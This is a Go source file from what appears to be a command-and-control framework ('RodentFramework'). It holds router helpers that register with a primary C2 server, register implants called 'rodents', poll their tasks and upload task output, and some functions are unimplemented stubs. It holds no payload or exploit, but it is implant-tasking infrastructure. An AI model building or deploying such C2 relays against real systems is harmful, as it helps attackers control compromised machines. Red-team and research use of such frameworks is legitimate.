package router

import (
	"bytes"
	"crypto/tls"
	"encoding/json"
	"io"
	"net/http"

	"github.com/RodentFramework/core/rodent"
)

/*
Helper functions for Routers that are written in golang.

TO DO: Add Router helper functions.


*/

type RodentServer struct {
	TlsConf tls.Config
	Address string
	Router  string
}

func (rs *RodentServer) serverRequest(method, path string, data []byte) ([]byte, error) {
	var buf *bytes.Buffer

	if data != nil {
		buf = bytes.NewBuffer(data)
	} else {
		buf = nil
	}

	//Create new request
	request, err := http.NewRequest(method, rs.Address+path, buf)
	if err != nil {
		return nil, err
	}
	tr := &http.Transport{TLSClientConfig: &rs.TlsConf}

	//init client and send request.
	client := &http.Client{Transport: tr}
	var resp *http.Response
	resp, err = client.Do(request)
	if err != nil {

		return nil, err
	}
	defer resp.Body.Close()

	request.Close = true

	if resp.StatusCode != 200 {

		return nil, nil
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {

		return nil, nil
	}

	return body, nil
}

// Register with the primary C2 Server and pass it valid router commands.
func (rs *RodentServer) RegisterWithServer(router *Router) error {
	routerbuf, err := json.Marshal(router)
	if err != nil {
		return err
	}

	bodyresp, err := rs.serverRequest("POST", "/router", routerbuf)
	if err != nil {
		return err
	}

	err = json.Unmarshal(bodyresp, router)
	if err != nil {
		return err
	}

	return nil

}

// Register a new rodent with primary C2 Server
func (rs *RodentServer) RegisterNewRodent(rdata *rodent.Rodent) error {
	rodentbuf, err := json.Marshal(rdata)
	if err != nil {
		return err
	}

	bodyresp, err := rs.serverRequest("POST", "/register", rodentbuf)
	if err != nil {
		return err
	}

	err = json.Unmarshal(bodyresp, rdata)
	if err != nil {
		return err
	}

	return nil

}

func (rs *RodentServer) GetRodentTasks(xid string) ([]rodent.Task, error) {
	var mytasks []rodent.Task

	bodyresp, err := rs.serverRequest("GET", "/tasks/"+xid, nil)
	if err != nil {
		return nil, err
	}

	err = json.Unmarshal(bodyresp, &mytasks)
	if err != nil {
		return nil, err
	}

	return mytasks, nil
}

// Send API Request to complete or update a task
func (rs *RodentServer) UpdateRodentTask(taskxid string, rtask *rodent.Task) error {

	taskbuf, err := json.Marshal(rtask)
	if err != nil {
		return err
	}

	_, err = rs.serverRequest("PUT", "/output/"+taskxid, taskbuf)
	if err != nil {
		return err
	}

	return nil
}

// UNIMPLEMENTED: Send Hearbeat for polling purposes.
func (rs *RodentServer) Heartbeat() {

}

// UNIMPLEMENTED:  Send file to Rodent Server.
func RouterSendFile(xid string, filedata []byte) {

}

// UNIMPLEMENTED:  Get File from Rodent Server.
func RouterGetFile(xid string) []byte {
	var filedat []byte

	return filedat

}
